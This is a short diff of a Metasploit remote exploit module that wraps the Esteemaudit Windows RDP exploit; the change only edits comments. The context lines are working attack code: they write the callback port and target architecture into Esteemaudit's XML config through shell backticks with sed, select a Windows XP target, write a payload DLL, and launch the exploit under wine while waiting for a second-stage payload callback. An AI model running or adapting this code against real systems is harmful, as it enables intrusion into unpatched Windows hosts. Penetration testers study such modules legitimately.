@@ -71,7 +71,6 @@ class MetasploitModule < Msf::Exploit::Remote
   sed = `sed -i 's/%CPORT%/#{datastore['CPORT']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
   
-  #WIN72K8R2 (6-8) and XP (0-5)
   if target.name =~ /Windows XP SP0/
 	objective = "XPSP0"
   elsif target.name =~ /Windows XP SP1/
@@ -109,7 +108,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	f.print dll
   end
 
-  #Send Exploit + Payload Injection
+  #Send Exploit
   print_status('Launching Esteemaudit...')
   output = `cd #{datastore['ESTEEMAUDITPATH']}; wine Esteemaudit-2.1.0.exe 2>null &`
   if output =~ /Waiting for callback from second stage payload/
